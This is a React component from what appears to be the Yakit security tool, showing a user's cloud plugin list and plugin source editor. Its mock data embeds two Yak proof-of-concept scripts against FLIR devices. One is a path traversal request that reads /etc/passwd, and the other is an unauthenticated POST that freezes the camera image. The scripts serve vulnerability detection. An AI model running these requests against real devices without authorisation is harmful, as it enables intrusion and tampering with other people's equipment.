import React, {useEffect, useMemo, useState} from "react"
import {PluginDetailHeader, PluginDetails, PluginDetailsListItem, statusTag} from "../baseTemplate"
import {
    OutlineClouddownloadIcon,
    OutlineCursorclickIcon,
    OutlineDotshorizontalIcon,
    OutlineFilterIcon,
    OutlineLockclosedIcon,
    OutlineLockopenIcon,
    OutlineShareIcon,
    OutlineTrashIcon
} from "@/assets/icon/outline"
import {useDebounceFn, useMemoizedFn} from "ahooks"
import {API} from "@/services/swagger/resposeType"
import {Tabs, Tooltip} from "antd"
import {YakitButton} from "@/components/yakitUI/YakitButton/YakitButton"
import {FuncBtn, FuncFilterPopover, OnlineExtraOperate} from "../funcTemplate"
import {YakitEditor} from "@/components/yakitUI/YakitEditor/YakitEditor"
import {yakitNotify} from "@/utils/notification"
import {YakitSegmented} from "@/components/yakitUI/YakitSegmented/YakitSegmented"
import {MePluginType, OnlineUserExtraOperate, mePluginTypeList} from "./PluginUser"
import {YakitPluginOnlineDetail} from "../online/PluginsOnlineType"
import {PluginSearchParams} from "../baseTemplateType"
import cloneDeep from "bizcharts/lib/utils/cloneDeep"

import "../plugins.scss"
import styles from "./PluginUserDetail.module.scss"
import classNames from "classnames"

const {ipcRenderer} = window.require("electron")

const {TabPane} = Tabs

interface PluginUserDetailProps {
    info: YakitPluginOnlineDetail
    allCheck: boolean
    loading: boolean
    onCheck: (value: boolean) => void
    selectList: string[]
    optCheck: (data: YakitPluginOnlineDetail, value: boolean) => void
    data: API.YakitPluginListResponse
    onBack: () => void
    loadMoreData: () => void
    defaultSearchValue: PluginSearchParams
}

export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
    const {info, allCheck, onCheck, selectList, optCheck, data, onBack, loadMoreData, loading, defaultSearchValue} =
        props
    const [search, setSearch] = useState<PluginSearchParams>(cloneDeep(defaultSearchValue))
    // 选中插件的数量
    const selectNum = useMemo(() => {
        if (allCheck) return data.pagemeta.total
        else return selectList.length
    }, [allCheck, selectList])

    const [plugin, setPlugin] = useState<YakitPluginOnlineDetail>()

    useEffect(() => {
        if (info) setPlugin({...info})
        else setPlugin(undefined)
    }, [info])

    const onRun = useMemoizedFn(() => {})
    // 返回
    const onPluginBack = useMemoizedFn(() => {
        onBack()
        setPlugin(undefined)
    })
    const onLikeClick = useMemoizedFn(() => {
        yakitNotify("success", "点赞~~~")
    })
    const onCommentClick = useMemoizedFn(() => {
        yakitNotify("success", "评论~~~")
    })
    const onDownloadClick = useMemoizedFn(() => {
        yakitNotify("success", "下载~~~")
    })

    const onUserDetailSelect = useMemoizedFn((key) => {
        switch (key) {
            case "share":
                yakitNotify("success", "分享~~~")
                break
            case "download":
                break
            case "editState":
                break
            case "remove":
                break
            default:
                break
        }
    })

    if (!plugin) return null
    return (
        <>
            <PluginDetails<YakitPluginOnlineDetail>
                title='我的云端插件'
                filterExtra={
                    <div className={"details-filter-extra-wrapper"}>
                        <YakitButton type='text2' icon={<OutlineFilterIcon />} />
                        <div style={{height: 12}} className='divider-style'></div>
                        <Tooltip title='下载插件' overlayClassName='plugins-tooltip'>
                            <YakitButton type='text2' icon={<OutlineClouddownloadIcon />} />
                        </Tooltip>
                        <div style={{height: 12}} className='divider-style'></div>
                        <Tooltip title='删除插件' overlayClassName='plugins-tooltip'>
                            <YakitButton type='text2' icon={<OutlineTrashIcon />} />
                        </Tooltip>
                        <div style={{height: 12}} className='divider-style'></div>
                        <YakitButton type='text'>新建插件</YakitButton>
                    </div>
                }
                checked={allCheck}
                onCheck={onCheck}
                total={data.pagemeta.total}
                selected={selectNum}
                listProps={{
                    rowKey: "uuid",
                    // data: data.data,
                    data: [
                        {
                            created_at: 1679901760,
                            id: 17054,
                            updated_at: 1690426437,
                            authors: "汤鲜味美砂锅面🍜",
                            comment_num: 0,
                            content:
                                '##server:flir\n##type:poc\n##params:root_url\n##name:FLIR_path_traversal_poc\n##severity:high\n##out_put:FLIR_path_traversal_poc_res\n\n\n\nyakit.AutoInitYakit()\nlog.setLevel("info")\npoc=func(addr){\n    isTls = str.IsTLSServer(addr)\n    packet=`GET /download.php?file=/etc/passwd HTTP/1.1\nHost: {{params(addr)}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`\n\n    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))\n    if err != nil {\n        die(err)\n    }\n\n    if str.MatchAllOfRegexp(rsp, `root:.*?:[0-9]*:[0-9]*:`)  {\n        risk.NewRisk(\n                root_url,\n                risk.severity("high"), \n                risk.title(f"FOUND ${root_url} 存在FLIR目录遍历漏洞"), \n                risk.titleVerbose("FLIR目录遍历漏洞"), \n                risk.type("信息窃取"), \n                risk.typeVerbose("路径遍历"),                 \n                risk.request(req), \n                risk.response(rsp), \n                risk.details({"FLIR_path_traversal_poc_res":true}), )\n    }\n\n}\n\n\nroot_url = cli.String("root_url")\nip, port, err = str.ParseStringToHostPort(root_url)\nif err != nil {\n    die(err)\n}\n\naddr = str.HostPort(ip, port)\npoc(addr)\n',
                            default_open: true,
                            downloaded_total: 27283,
                            head_img:
                                "https://thirdwx.qlogo.cn/mmopen/vi_32/HnGn3rXrf8y4UjybTDyicJACffzs7cX4Rx3ZWNibZFsmfEKhV7mcuX3zZDpXr58iczaqQfWUYh2jKaqJJe46xt79A/132",
                            is_private: false,
                            is_stars: false,
                            official: false,
                            params: [
                                {
                                    default_value: "",
                                    field: "root_url",
                                    field_verbose: "",
                                    help: "",
                                    required: true,
                                    type_verbose: "string"
                                }
                            ],
                            plugin_selector_types: "mitm,port-scan",
                            published_at: 0,
                            script_name: "FLIR目录遍历漏洞检测",
                            stars: 0,
                            status: 1,
                            tags: '["POC","目录遍历","FLIR"]',
                            type: "yak",
                            user_id: 1773,
                            uuid: "ba9834eb-6d09-44db-9586-f67e3ac7095f"
                        },
                        {
                            created_at: 1679901764,
                            id: 17055,
                            updated_at: 1690426437,
                            authors: "汤鲜味美砂锅面🍜",
                            comment_num: 0,
                            content:
                                '##server:flir\n##type:poc\n##params:root_url\n##name:FLIR_13216_unauth_poc\n##severity:high\n##out_put:FLIR_13216_Freeze_RTSP_stream_res\n\n\nyakit.AutoInitYakit()\nlog.setLevel("info")\n\npoc=func(addr){\n    isTls = str.IsTLSServer(addr)\n    packet = `POST /res.php HTTP/1.1\nHost: {{params(addr)}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36\n\naction=set&resource=.image.state.freeze.set&value=true`\n\n    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))\n    if err != nil {\n        die(err)\n    }    \n    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)\n    if err != nil {\n        die(err)\n    }\n    if http_rsp.StatusCode<400{\n        risk.NewRisk(\n            root_url,\n            risk.severity("high"), \n            risk.title(f"FOUND ${root_url} 存在FLIR未授权访问漏洞"), \n            risk.titleVerbose("FLIR未授权访问漏洞"), \n            risk.type("身份伪造"), \n            risk.typeVerbose("配置错误"),                 \n            risk.request(req), \n            risk.response(rsp), \n            risk.details({"FLIR_13216_Freeze_RTSP_stream_res":true}), \n        )        \n    }\n\n\n\n\n}\n\n\n\n\nroot_url = cli.String("root_url")\nip, port, err = str.ParseStringToHostPort(root_url)\nif err != nil {\n    die(err)\n}\n\naddr = str.HostPort(ip, port)\npoc(addr)',
                            default_open: true,
                            downloaded_total: 27392,
                            head_img:
                                "https://thirdwx.qlogo.cn/mmopen/vi_32/HnGn3rXrf8y4UjybTDyicJACffzs7cX4Rx3ZWNibZFsmfEKhV7mcuX3zZDpXr58iczaqQfWUYh2jKaqJJe46xt79A/132",
                            is_private: false,
                            is_stars: false,
                            official: false,
                            params: [
                                {
                                    default_value: "",
                                    field: "root_url",
                                    field_verbose: "",
                                    help: "",
                                    required: true,
                                    type_verbose: "string"
                                }
                            ],
                            plugin_selector_types: "mitm,port-scan",
                            published_at: 0,
                            script_name: "FLIR未授权访问漏洞检测",
                            stars: 0,
                            status: 1,
                            tags: '["POC","未授权访问","FLIR"]',
                            type: "yak",
                            user_id: 1773,
                            uuid: "f5901d47-2715-4a8b-b09f-2a733419229e"
                        }
                    ],
                    loadMoreData: loadMoreData,
                    classNameRow: "plugin-details-opt-wrapper",
                    renderRow: (info, i) => {
                        const check = allCheck || selectList.includes(info.uuid)
                        return (
                            <PluginDetailsListItem<YakitPluginOnlineDetail>
                                plugin={info}
                                selectUUId={plugin.uuid}
                                check={check}
                                headImg={info.head_img}
                                pluginUUId={info.uuid}
                                pluginName={info.script_name}
                                help={info.help}
                                content={info.content}
                                optCheck={optCheck}
                                official={info.official}
                                // isCorePlugin={info.is_core_plugin}
                                isCorePlugin={false}
                                pluginType={info.type}
                                extra={statusTag[`${1 % 3}`]}
                            />
                        )
                    },
                    page: data.pagemeta.page,
                    hasMore: data.pagemeta.total !== data.data.length,
                    loading: loading,
                    defItemHeight: 46
                }}
                onBack={onPluginBack}
                search={search}
                setSearch={setSearch}
            >
                <div className={styles["details-content-wrapper"]}>
                    <Tabs tabPosition='right' className='plugins-tabs'>
                        <TabPane tab='源 码' key='code'>
                            <div className={styles["plugin-info-wrapper"]}>
                                <PluginDetailHeader
                                    pluginName={plugin.script_name}
                                    help={plugin.help}
                                    tags={plugin.tags}
                                    extraNode={
                                        <div className={styles["plugin-info-extra-header"]}>
                                            <OnlineUserExtraOperate plugin={plugin} onSelect={onUserDetailSelect} />
                                            <FuncBtn
                                                maxWidth={1100}
                                                icon={<OutlineCursorclickIcon />}
                                                name={"去使用"}
                                                onClick={onRun}
                                            />
                                        </div>
                                    }
                                    img={plugin.head_img}
                                    user={plugin.authors}
                                    pluginId={plugin.uuid}
                                    updated_at={plugin.updated_at}
                                />
                                <div className={styles["details-editor-wrapper"]}>
                                    <YakitEditor type={"yak"} value={plugin.content} />
                                </div>
                            </div>
                        </TabPane>
                        <TabPane tab='日志' key='log' disabled={true}>
                            <div>日志</div>
                        </TabPane>
                    </Tabs>
                </div>
            </PluginDetails>
        </>
    )
}
